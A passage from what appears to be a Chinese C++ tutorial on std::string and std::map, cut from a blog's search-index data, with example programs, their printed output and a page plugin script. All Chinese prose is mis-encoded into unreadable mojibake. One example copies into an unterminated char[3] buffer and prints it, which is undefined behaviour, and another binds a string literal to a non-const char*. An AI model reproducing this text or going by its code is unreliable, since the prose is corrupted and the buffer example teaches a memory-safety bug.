å­—ç¬¦ä¸²åœ¨æ­£å‘çš„ä½ç½®ï¼ˆå³æœ€åä¸€æ¬¡å‡ºç°çš„æ­£å‘ä½ç½®ï¼‰ã€‚ string çš„æ›¿æ¢ string &amp;replace(int pos, int n, const char *s);ï¼Œåˆ é™¤ä» pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦ï¼Œç„¶ååœ¨ pos ä½ç½®æ’å…¥å­—ç¬¦ä¸² s string &amp;replace(int pos, int n, const string &amp;s);ï¼Œåˆ é™¤ä» pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦ï¼Œç„¶ååœ¨ pos ä½ç½®æ’å…¥å­—ç¬¦ä¸² s void swap(string &amp;s2);ï¼Œäº¤æ¢å½“å‰å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸² s2 çš„å€¼ string çš„æ¯”è¾ƒ int compare(const string &amp;s) const;ï¼Œä¸å­—ç¬¦ä¸² s æ¯”è¾ƒ int compare(const char *s) const;ï¼Œä¸å­—ç¬¦ä¸² s æ¯”è¾ƒ compare() å‡½æ•°çš„ç»“æœåœ¨ &gt; æ—¶è¿”å› 1ï¼Œ&lt; æ—¶è¿”å› -1ï¼Œ= æ—¶è¿”å› 0ã€‚å­—ç¬¦ä¸²æ¯”è¾ƒåŒºåˆ†å¤§å°å†™ï¼Œæ¯”è¾ƒæ—¶å‚è€ƒå­—å…¸é¡ºåºï¼Œæ’è¶Šå‰é¢çš„è¶Šå°ã€‚å¤§å†™çš„ Aï¼ˆ65ï¼‰ æ¯”å°å†™çš„ aï¼ˆ97ï¼‰ å°ã€‚ string çš„å­—ç¬¦å­˜å‚¨ char &amp;at(int n); char &amp;operator[] (int n); operator[] å’Œ at() å‡è¿”å›å½“å‰å­—ç¬¦ä¸²ä¸­çš„ç¬¬ n ä¸ªå­—ç¬¦ï¼Œä½†äºŒè€…æ˜¯æœ‰åŒºåˆ«çš„ at() åœ¨è¶Šç•Œæ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œ[] åœ¨åˆšå¥½è¶Šç•Œæ—¶ä¼šè¿”å› (char)0ï¼Œå†ç»§ç»­è¶Šç•Œæ—¶ï¼Œç¨‹åºå¼‚å¸¸ç»ˆæ­¢ å¦‚æœç¨‹åºå¸Œæœ›å¯ä»¥é€šè¿‡ try catch æ•è·å¼‚å¸¸ï¼Œåˆ™å»ºè®®é‡‡ç”¨ at() string çš„åŒºé—´æ’å…¥ string &amp;insert(int pos, const char *s);ï¼Œåœ¨ pos ä½ç½®æ’å…¥å­—ç¬¦ä¸² sï¼Œè¿”å›ä¿®æ”¹åçš„å­—ç¬¦ä¸² string &amp;insert(int pos, const string &amp;s);ï¼Œåœ¨ pos ä½ç½®æ’å…¥å­—ç¬¦ä¸² sï¼Œè¿”å›ä¿®æ”¹åçš„å­—ç¬¦ä¸² string &amp;insert(int pos, int n, char c);ï¼Œåœ¨ pos ä½ç½®æ’å…¥ n ä¸ªå­—ç¬¦ cï¼Œè¿”å›ä¿®æ”¹åçš„å­—ç¬¦ä¸² string çš„åŒºé—´åˆ é™¤ string &amp;erase(int pos=0, int n=npos);ï¼Œåˆ é™¤ä» pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦ï¼Œè¿”å›ä¿®æ”¹åçš„å­—ç¬¦ä¸² string çš„å­—ç¬¦ä¸²æ‹¼æ¥ string &amp;operator+=(const string &amp;s);ï¼ŒæŠŠå­—ç¬¦ä¸² s è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;operator+=(const char *s);ï¼ŒæŠŠå­—ç¬¦ä¸² s è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;append(const char *s); ï¼ŒæŠŠå­—ç¬¦ä¸² s è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;append(const char *s, int n);ï¼ŒæŠŠå­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;append(const string &amp;s); ï¼ŒæŠŠå­—ç¬¦ä¸² s è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;append(const string &amp;s, int pos, int n);ï¼ŒæŠŠå­—ç¬¦ä¸² s ä¸­ä» pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦è¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾ string &amp;append(int n, char c); ï¼Œåœ¨å½“å‰å­—ç¬¦ä¸²çš„ç»“å°¾æ·»åŠ  n ä¸ªå­—ç¬¦ c ä» string å–å¾— char* const char *c_str() const;ï¼Œè¿”å›ä¸€ä¸ªä»¥ \\0 ç»“å°¾çš„å­—ç¬¦ä¸²çš„é¦–åœ°å€ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œchar * å¯ä»¥éšå¼è½¬æ¢ä¸º string ç±»å‹ï¼Œåè¿‡æ¥åˆ™ä¸å¯ä»¥ï¼Œä¾‹å¦‚å³è¾¹è¿™ç§å†™æ³•æ˜¯åˆæ³•çš„ï¼š char *p = "abc"; string str = p; å°† string æ‹·è´åˆ° char* æŒ‡å‘çš„å†…å­˜ç©ºé—´ int copy(char *s, int n, int pos=0) const; å°†å½“å‰ä¸²ä¸­ä»¥ pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦æ‹·è´åˆ°ä»¥ s ä¸ºèµ·å§‹ä½ç½®çš„å­—ç¬¦æ•°ç»„ä¸­ï¼Œè¿”å›å®é™…æ‹·è´çš„å­—ç¬¦æ•°é‡ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè¦ä¿è¯æŒ‡é’ˆ s æ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´è¶³ä»¥å®¹çº³å½“å‰çš„å­—ç¬¦ä¸²ï¼Œä¸ç„¶å¯èƒ½ä¼šå‘ç”Ÿè¶Šç•Œã€‚ string å®¹å™¨çš„å¸¸ç”¨æ“ä½œ string å®¹å™¨çš„æ„é€ ä¸èµ‹å€¼ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int main() { // é»˜è®¤æ„é€ å‡½æ•° string str1; // æ‹·è´æ„é€ å‡½æ•° string str2 = str1; // æœ‰å‚æ„é€ å‡½æ•° string str3("abced"); string str4(5, \'f\'); // åŸºæœ¬èµ‹å€¼ str1 = "123456"; str2 = str3; str3.assign("mnopq", 3); str4.assign("45678", 1, 3); // ä»0å¼€å§‹ç´¢å¼•ï¼Œ1è¡¨ç¤ºç¬¬2ä¸ªå­—ç¬¦ cout &lt;&lt; "str1 = " &lt;&lt; str1 &lt;&lt; endl; cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234str1 = 123456str2 = abcedstr3 = mnostr4 = 567 string å®¹å™¨çš„ API è°ƒç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;using namespace std;int main() { // å­˜å‚¨å­—ç¬¦ string str1 = "abcde"; for (int i = 0; i &lt; str1.size(); i++) { // ç¬¬ä¸€ç§æ–¹å¼ cout &lt;&lt; str1[i] &lt;&lt; " "; // ç¬¬äºŒç§æ–¹å¼ // cout &lt;&lt; str1.at(i) &lt;&lt; " "; } cout &lt;&lt; endl; // å­—ç¬¦ä¸²æ‹¼æ¥ string str2 = "hello "; string str3 = "world "; str2 += str3; str3.append("where"); cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; // å­—ç¬¦ä¸²æŸ¥æ‰¾ string str4 = "My name is Peter"; int index1 = str4.find("name"); cout &lt;&lt; "index1 = " &lt;&lt; index1 &lt;&lt; endl; int index2 = str4.rfind("e"); cout &lt;&lt; "index2 = " &lt;&lt; index2 &lt;&lt; endl; // å­—ç¬¦ä¸²æ›¿æ¢ string str5 = "abc123"; str5.replace(3, 3, "def"); cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; string str6 = "123456"; string str7 = "654321"; str6.swap(str7); cout &lt;&lt; "str6 = " &lt;&lt; str6 &lt;&lt; endl; // å­—ç¬¦ä¸²æ¯”è¾ƒ string str8 = "ABC"; string str9 = "abc"; int result = str8.compare(str9); // è¿”å›å€¼å°äºç­‰äº-1 cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; // æˆªå–å­å­—ç¬¦ä¸² string str10 = "124abc"; string str11 = str10.substr(1, 3); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // å­—ç¬¦ä¸²çš„åŒºé—´æ’å…¥ string str12 = "abcdef"; str12.insert(2, "123"); cout &lt;&lt; "str12 = " &lt;&lt; str12 &lt;&lt; endl; // å­—ç¬¦ä¸²çš„åŒºé—´åˆ é™¤ string str13 = "123456"; str13.erase(2, 2); cout &lt;&lt; "str13 = " &lt;&lt; str13 &lt;&lt; endl; // ä»å­—ç¬¦ä¸²å–å¾— char * string str14 = "hijkl"; const char *p1 = str14.c_str(); cout &lt;&lt; "p1 = " &lt;&lt; p1 &lt;&lt; endl; // char * éšå¼ç±»å‹è½¬æ¢ä¸º string char *p2 = "abc123"; string str15 = p2; cout &lt;&lt; "str15 = " &lt;&lt; str15 &lt;&lt; endl; // å°† string æ‹·è´åˆ° char* æŒ‡å‘çš„å†…å­˜ç©ºé—´ char *p3 = new char[3]; string str16 = "hello jim"; int number = str16.copy(p3, 3, 2); cout &lt;&lt; "number = " &lt;&lt; number &lt;&lt; endl; cout &lt;&lt; "p3 = " &lt;&lt; p3 &lt;&lt; endl; delete[] p3; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789101112131415a b c d e str2 = hello world str3 = world whereindex1 = 3index2 = 14str5 = abcdefstr6 = 654321result = -32str11 = 24astr12 = ab123cdefstr13 = 1256p1 = hijklstr15 = abc123number = 3p3 = llo map å®¹å™¨map å®¹å™¨çš„æ¦‚å¿µmap æ˜¯ STL çš„ä¸€ä¸ªå…³è”å¼å®¹å™¨ï¼Œå®ƒæä¾›ä¸€å¯¹ä¸€ï¼ˆå…¶ä¸­ç¬¬ä¸€ä¸ªç§°ä¸ºå…³é”®å­—ï¼Œæ¯ä¸ªå…³é”®å­—åªèƒ½åœ¨ map ä¸­å‡ºç°ä¸€æ¬¡ï¼Œç¬¬äºŒä¸ªç§°ä¸ºè¯¥å…³é”®å­—çš„å€¼ï¼‰çš„æ•°æ®å¤„ç†èƒ½åŠ›ã€‚map å®¹å™¨å­˜å‚¨çš„éƒ½æ˜¯ pair å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ç”¨ pair ç±»æ¨¡æ¿åˆ›å»ºçš„é”®å€¼å¯¹ã€‚å…¶ä¸­ï¼Œå„ä¸ªé”®å€¼å¯¹çš„é”®å’Œå€¼å¯ä»¥æ˜¯ä»»æ„æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬ C++ åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆintã€double ç­‰ï¼‰ã€ä½¿ç”¨ç»“æ„ä½“æˆ–ç±»è‡ªå®šä¹‰çš„ç±»å‹ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œmap å®¹å™¨ä¸­å­˜å‚¨çš„å„ä¸ªé”®å€¼å¯¹éƒ½é€‰ç”¨ string å­—ç¬¦ä¸²ä½œä¸ºé”®çš„ç±»å‹ã€‚map å†…éƒ¨è‡ªå»ºäº†ä¸€é¢—çº¢é»‘æ ‘ (ä¸€ç§éä¸¥æ ¼æ„ä¹‰ä¸Šçš„å¹³è¡¡äºŒå‰æ ‘)ï¼Œè¿™é¢—æ ‘å…·æœ‰å¯¹æ•°æ®è‡ªåŠ¨æ’åºçš„åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨ map å†…éƒ¨æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯æœ‰åºçš„ã€‚map çš„ç‰¹ç‚¹æ˜¯å¢åŠ å’Œåˆ é™¤èŠ‚ç‚¹å¯¹è¿­ä»£å™¨çš„å½±å“å¾ˆå°ï¼Œé™¤äº†é‚£ä¸ªè¢«æ“ä½œçš„èŠ‚ç‚¹ï¼Œå¯¹å…¶ä»–çš„èŠ‚ç‚¹éƒ½æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨ map å®¹å™¨å­˜å‚¨çš„å„ä¸ªé”®å€¼å¯¹ï¼Œé”®çš„å€¼æ—¢ä¸èƒ½é‡å¤ä¹Ÿä¸èƒ½è¢«ä¿®æ”¹ã€‚map å¯ä»¥æ ¹æ® key å€¼å¿«é€ŸæŸ¥æ‰¾è®°å½•ï¼Œå¤æ‚åº¦åœ¨ log(n) çº§åˆ«ï¼Œå¦‚æœæœ‰ 1000 æ¡è®°å½•ï¼Œæœ€å¤šæŸ¥æ‰¾ 10 æ¬¡ï¼Œå¦‚æœæœ‰ 1000000 æ¡è®°å½•ï¼Œæœ€å¤šæŸ¥æ‰¾ 20 æ¬¡ã€‚ map å®¹å™¨çš„å¸¸ç”¨æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main() { // å®šä¹‰Mapé›†åˆå˜é‡ map&lt;int, int&gt; m; // ç¬¬ä¸€ç§æ•°æ®æ’å…¥æ–¹å¼ m.insert(pair&lt;int, int&gt;(1, 2)); // ç¬¬äºŒç§æ•°æ®æ’å…¥æ–¹å¼ï¼ˆæ¨èï¼‰ m.insert(make_pair(3, 4)); // ç¬¬ä¸‰ç§æ•°æ®æ’å…¥æ–¹å¼ m.insert(map&lt;int, int&gt;::value_type(5, 6)); // ç¬¬å››ç§æ•°æ®æ’å…¥æ–¹å¼ m[7] = 8; // ç¬¬ä¸€ç§æ–¹å¼éå†Mapé›†åˆ for (map&lt;int, int&gt;::iterator it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // ç¬¬äºŒç§æ–¹å¼éå†Mapé›†åˆ for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // è·å–æŒ‡å®šçš„Key map&lt;int, int&gt;::iterator item = m.find(5); cout &lt;&lt; "key = " &lt;&lt; item-&gt;first &lt;&lt; " , value = " &lt;&lt; item-&gt;second &lt;&lt; endl; cout &lt;&lt; endl; // ç¬¬ä¸€ç§æ–¹å¼åˆ¤æ–­Keyæ˜¯å¦å­˜åœ¨ // å¦‚æœKeyå­˜åœ¨ï¼Œfind()å‡½æ•°ä¼šè¿”å›Keyå¯¹åº”çš„è¿­ä»£å™¨ï¼Œå¦‚æœKeyä¸å­˜åœ¨ï¼Œfind()å‡½æ•°ä¼šè¿”å›å°¾åè¿­ä»£å™¨end() if (m.find(100) == m.end()) { cout &lt;&lt; "key " &lt;&lt; 100 &lt;&lt; " not exist" &lt;&lt; endl; } cout &lt;&lt; endl; // ç¬¬äºŒç§æ–¹å¼åˆ¤æ–­Keyæ˜¯å¦å­˜åœ¨ // count()å‡½æ•°ç”¨äºç»Ÿè®¡Keyå€¼åœ¨Mapä¸­å‡ºç°çš„æ¬¡æ•°ï¼ŒMapçš„Keyæ˜¯ä¸å…è®¸é‡å¤çš„ï¼Œå› æ­¤å¦‚æœKeyå­˜åœ¨ä¼šè¿”å›1ï¼Œä¸å­˜åœ¨ä¼šè¿”å›0 if (m.count(5) == 1) { cout &lt;&lt; "key " &lt;&lt; 5 &lt;&lt; " existed" &lt;&lt; endl; } cout &lt;&lt; endl; // åˆ é™¤æŒ‡å®šçš„Key m.erase(7); for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; }} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345678910111213141516171819key = 1 , 2key = 3 , 4key = 5 , 6key = 7 , 8key = 1 , value = 2key = 3 , value = 4key = 5 , value = 6key = 7 , value = 8key = 5 , value = 6key 100 not existkey 5 existedkey = 1 , value = 2key = 3 , value = 4key = 5 , value = 6 å‚è€ƒèµ„æ–™ C++ ä¸­ string æˆå‘˜å‡½æ•° length ()ã€size () ä¸ strlen () çš„åŒºåˆ« var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹äº”",url:"/posts/64fd9f88.html",text:'åŸºæœ¬æ¦‚å¿µæ¨¡æ¿çš„åŸºæœ¬æ¦‚å¿µæ¨¡æ¿æ˜¯å®ç°ä»£ç é‡ç”¨æœºåˆ¶çš„ä¸€ç§é‡è¦å·¥å…·ï¼Œå…¶æœ¬è´¨æ˜¯ç±»å‹å‚æ•°åŒ–ï¼Œå³æŠŠç±»å‹å®šä¹‰ä¸ºå‚æ•°ã€‚C++ æä¾›äº†ç±»æ¨¡æ¿å’Œå‡½æ•°æ¨¡æ¿ï¼Œè¯¦ç»†çš„ä½¿ç”¨å¯å‚è€ƒæ•™ç¨‹ï¼šC++ è¿›é˜¶åŸºç¡€ä¹‹äºŒ ç±»æ¨¡æ¿çš„ç®€ä»‹ ç±»æ¨¡æ¿çš„æœ¬è´¨å°±æ˜¯å»ºç«‹ä¸€ä¸ªé€šç”¨ç±»ï¼Œå…¶æˆå‘˜å˜é‡çš„ç±»å‹ã€æˆå‘˜å‡½æ•°çš„è¿”å›ç±»å‹å’Œå‚æ•°ç±»å‹éƒ½å¯ä»¥ä¸å…·ä½“æŒ‡å®šï¼Œè€Œç”¨è™šæ‹Ÿçš„ç±»å‹æ¥æ›¿ä»£ å½“ä½¿ç”¨ç±»æ¨¡æ¿å»ºç«‹å¯¹è±¡æ—¶ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®å®å‚çš„ç±»å‹å–ä»£ç±»æ¨¡æ¿ä¸­çš„è™šæ‹Ÿç±»å‹ï¼Œä»è€Œå®ç°ä¸åŒç±»çš„åŠŸèƒ½ å‡½æ•°æ¨¡æ¿çš„ç®€ä»‹ å‡½æ•°æ¨¡æ¿å°±æ˜¯å»ºç«‹ä¸€ä¸ªé€šç”¨çš„å‡½æ•°ï¼Œå…¶å‡½æ•°è¿”å›ç±»å‹å’Œå½¢å‚ç±»å‹ä¸å…·ä½“æŒ‡å®šï¼Œè€Œæ˜¯ç”¨è™šæ‹Ÿçš„ç±»å‹æ¥æ›¿ä»£ å‡¡æ˜¯å‡½æ•°ä½“ç›¸åŒçš„å‡½æ•°éƒ½å¯ä»¥ç”¨å‡½æ•°æ¨¡æ¿æ¥ä»£æ›¿ï¼Œä¸å¿…å®šä¹‰å¤šä¸ªå‡½æ•°ï¼Œåªéœ€åœ¨æ¨¡æ¿ä¸­å®šä¹‰ä¸€æ¬¡å³å¯ åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®å®å‚çš„ç±»å‹æ¥å–ä»£æ¨¡æ¿ä¸­çš„è™šæ‹Ÿç±»å‹ï¼Œä»è€Œå®ç°ä¸åŒå‡½æ•°çš„åŠŸèƒ½ STL çš„åŸºæœ¬æ¦‚å¿µSTL çš„ç®€ä»‹STLï¼ˆStandard Template Libraryï¼Œæ ‡å‡†æ¨¡æ¿åº“ï¼‰æ˜¯æƒ æ™®å®éªŒå®¤å¼€å‘çš„ä¸€ç³»åˆ—è½¯ä»¶çš„ç»Ÿç§°ã€‚ç°ç„¶ä¸»è¦å‡ºç°åœ¨ C++ ä¸­ï¼Œä½†åœ¨è¢«å¼•å…¥ C++ ä¹‹å‰è¯¥æŠ€æœ¯å°±å·²ç»å­˜åœ¨äº†å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´ã€‚STL çš„ä»å¹¿ä¹‰ä¸Šè®²åˆ†ä¸ºä¸‰ç±»ï¼šAlgorithmï¼ˆç®—æ³•ï¼‰ã€Containerï¼ˆå®¹å™¨ï¼‰å’Œ Iteratorï¼ˆè¿­ä»£å™¨ï¼‰ï¼Œå®¹å™¨å’Œç®—æ³•é€šè¿‡è¿­ä»£å™¨å¯ä»¥è¿›è¡Œæ— ç¼åœ°è¿æ¥ã€‚å‡ ä¹æ‰€æœ‰çš„ STL ä»£ç éƒ½é‡‡ç”¨äº†ç±»æ¨¡æ¿å’Œå‡½æ•°æ¨¡æ¿çš„æ–¹å¼ç¼–å†™ï¼Œè¿™ç›¸æ¯”äºä¼ ç»Ÿçš„ç”±ç±»å’Œå‡½æ•°ç»„æˆçš„åº“æ¥è¯´æä¾›äº†æ›´å¥½çš„ä»£ç é‡ç”¨æœºä¼šã€‚ä»é€»è¾‘å±‚æ¬¡æ¥çœ‹ï¼Œåœ¨ STL ä¸­ä½“ç°äº†æ³›å‹åŒ–ç¨‹åºè®¾è®¡çš„æ€æƒ³ï¼ˆGeneric Programmingï¼‰ï¼Œåœ¨è¿™ç§æ€æƒ³é‡Œï¼Œå¤§éƒ¨åˆ†çš„åŸºæœ¬ç®—æ³•è¢«æŠ½è±¡å’Œè¢«æ³›åŒ–ï¼Œç‹¬ç«‹äºä¸ä¹‹å¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œç”¨äºä»¥ç›¸åŒæˆ–ç›¸è¿‘çš„æ–¹å¼å¤„ç†å„ç§ä¸åŒæƒ…å½¢ã€‚ä»å®ç°å±‚æ¬¡çœ‹ï¼Œæ•´ä¸ª STL æ˜¯ä»¥ä¸€ç§ç±»å‹å‚æ•°åŒ–ï¼ˆType Parameterizedï¼‰çš„æ–¹å¼å®ç°çš„ï¼Œæœ¬è´¨æ˜¯åŸºäºæ¨¡æ¿ï¼ˆTemplateï¼‰ã€‚åœ¨ C++ æ ‡å‡†ä¸­ï¼ŒSTL è¢«ç»„ç»‡ä¸ºä¸‹é¢çš„ 13 ä¸ªå¤´æ–‡ä»¶ï¼š&lt;algorithm&gt;ã€&lt;deque&gt;ã€&lt;functional&gt;ã€&lt;iterator&gt;ã€&lt;vector&gt;ã€&lt;list&gt;ã€&lt;map&gt;ã€&lt;memory&gt;ã€&lt;numeric&gt;ã€&lt;queue&gt;ã€&lt;set&gt;ã€&lt;stack&gt; ã€&lt;utility&gt;ã€‚ STL çš„ä¼˜åŠ¿ STL æ˜¯ C++ çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ä¸ç”¨é¢å¤–å®‰è£…ä»€ä¹ˆå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå› ä¸ºå®ƒè¢«å†…å»ºåœ¨ç¼–è¯‘å™¨ä¹‹å†… STL çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯æ•°æ®ç»“æ„å’Œç®—æ³•çš„åˆ†ç¦»ï¼Œå°½ç®¡è¿™æ˜¯ä¸ªç®€å•çš„æ¦‚å¿µï¼Œä½†æ˜¯è¿™ç§åˆ†ç¦»ä½¿ STL å˜å¾—éå¸¸é€šç”¨ å¼€å‘äººå‘˜ä¸€èˆ¬å¯ä»¥ä¸ç”¨æ€è€ƒ STL å…·ä½“çš„å®ç°è¿‡ç¨‹ï¼Œåªè¦èƒ½å¤Ÿç†Ÿç»ƒä½¿ç”¨ STL å°±å¯ä»¥äº†ï¼Œè¿™æ ·å¯ä»¥æŠŠç²¾åŠ›æ”¾åœ¨ç¨‹åºå¼€å‘çš„å…¶ä»–æ–¹é¢ STL å…·æœ‰é«˜å¯é‡ç”¨æ€§ã€é«˜æ€§èƒ½ã€é«˜ç§»æ¤æ€§ã€è·¨å¹³å°çš„ä¼˜ç‚¹ é«˜ç§»æ¤æ€§ï¼šå¦‚åœ¨é¡¹ç›® A ä¸Šä½¿ç”¨ STL ç¼–å†™çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ç§»æ¤åˆ°é¡¹ç›® B ä¸Š è·¨å¹³å°ï¼šå¦‚ç”¨ Windows çš„ Visual Studio ç¼–å†™çš„ä»£ç ï¼Œå¯ä»¥åœ¨ Mac OS çš„ XCode ä¸Šç›´æ¥ç¼–è¯‘ é«˜æ€§èƒ½ï¼šå¦‚ map å¯ä»¥é«˜æ•ˆåœ°ä»åä¸‡æ¡è®°å½•é‡Œé¢æŸ¥æ‰¾å‡ºæŒ‡å®šçš„è®°å½•ï¼Œå› ä¸º map æ˜¯é‡‡ç”¨çº¢é»‘æ ‘çš„å˜ä½“å®ç°çš„ï¼ˆçº¢é»‘æ ‘æ˜¯å¹³æ¨ªäºŒå‰æ ‘çš„ä¸€ç§ï¼‰ é«˜å¯é‡ç”¨æ€§ï¼šSTL ä¸­å‡ ä¹æ‰€æœ‰çš„ä»£ç éƒ½é‡‡ç”¨äº†ç±»æ¨¡æ¿å’Œå‡½æ•°æ¨¡æ¿çš„æ–¹å¼å®ç°ï¼Œè¿™ç›¸æ¯”äºä¼ ç»Ÿçš„ç”±å‡½æ•°å’Œç±»ç»„æˆçš„åº“æ¥è¯´æä¾›äº†æ›´å¥½çš„ä»£ç é‡ç”¨æœºä¼š STL çš„å…­å¤§ç»„ä»¶ å®¹å™¨ï¼ˆContainersï¼‰ï¼šå„ç§æ•°æ®ç»“æ„ï¼Œå¦‚ vectorã€listã€dequeã€setã€map ç”¨æ¥å­˜æ”¾æ•°æ®ï¼ŒSTL å®¹å™¨æ˜¯ä¸€ç§ç±»æ¨¡æ¿ã€‚ ç®—æ³•ï¼ˆAlgorithmsï¼‰ï¼šå„ç§å¸¸ç”¨ç®—æ³•å¦‚ sortã€searchã€copyã€eraseï¼Œä»å®ç°çš„è§’åº¦æ¥çœ‹ï¼ŒSTL ç®—æ³•æ˜¯ä¸€ç§å‡½æ•°æ¨¡æ¿ã€‚ è¿­ä»£å™¨ï¼ˆIteratorsï¼‰ï¼šæ‰®æ¼”å®¹å™¨ä¸ç®—æ³•ä¹‹é—´çš„èƒ¶åˆå‰‚ï¼Œæ˜¯æ‰€è°“çš„ æ³›å‹æŒ‡é’ˆï¼Œå…±æœ‰äº”ç§ç±»å‹ï¼Œä»¥åŠå…¶å®ƒè¡ç”Ÿå˜ä½“ã€‚ä»å®ç°çš„è§’åº¦æ¥çœ‹ï¼Œè¿­ä»£å™¨æ˜¯ä¸€ç§å°† Operators*ã€Operator-&gt;ã€Operator++ã€Operator-- ç­‰ç›¸å…³æ“ä½œäºˆä»¥é‡è½½çš„ç±»æ¨¡æ¿ã€‚æ‰€æœ‰ STL å®¹å™¨éƒ½é™„å¸¦æœ‰è‡ªå·±ä¸“å±çš„è¿­ä»£å™¨ï¼ŒåŸç”ŸæŒ‡é’ˆï¼ˆNative pointerï¼‰ä¹Ÿæ˜¯ä¸€ç§è¿­ä»£å™¨ã€‚ ä»¿å‡½æ•°ï¼ˆFunctorsï¼‰ï¼š è¡Œä¸ºç±»ä¼¼å‡½æ•°ï¼Œå¯ä½œä¸ºç®—æ³•çš„æŸç§ç­–ç•¥ï¼ˆPolicyï¼‰ï¼Œä»å®ç°çš„è§’åº¦æ¥çœ‹ï¼Œä»¿å‡½æ•°æ˜¯ä¸€ç§é‡è½½äº† Operator() çš„ç±»æˆ–è€…ç±»æ¨¡æ¿ã€‚ä¸€èˆ¬å‡½æ•°æŒ‡é’ˆå¯è§†ä¸ºç‹­ä¹‰çš„ä»¿å‡½æ•°ã€‚ é€‚é…å™¨ï¼ˆAdaptersï¼‰ï¼šä¸€ç§ç”¨æ¥ä¿®é¥°å®¹å™¨ï¼ˆContainersï¼‰æˆ–ä»¿å‡½æ•°ï¼ˆFunctorsï¼‰æˆ–è¿­ä»£å™¨ï¼ˆIteratorsï¼‰æ¥å£çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ï¼šSTL æä¾›çš„ Queue å’Œ Stackï¼Œè™½ç„¶çœ‹ä¼¼å®¹å™¨ï¼Œä½†åªèƒ½ç®—æ˜¯ä¸€ç§å®¹å™¨é€‚é…å™¨ï¼Œå› ä¸ºå®ƒä»¬çš„åº•å±‚å®Œå…¨å€ŸåŠ© Dequeï¼Œæ‰€æœ‰æ“ä½œéƒ½ç”±åº•å±‚çš„ Deque æä¾›ã€‚æ”¹å˜ Functor æ¥å£è€…ï¼Œç§°ä¸º Function Adapterï¼›æ”¹å˜ Container æ¥å£è€…ï¼Œç§°ä¸º Container Adapterï¼›æ”¹å˜ Iterator 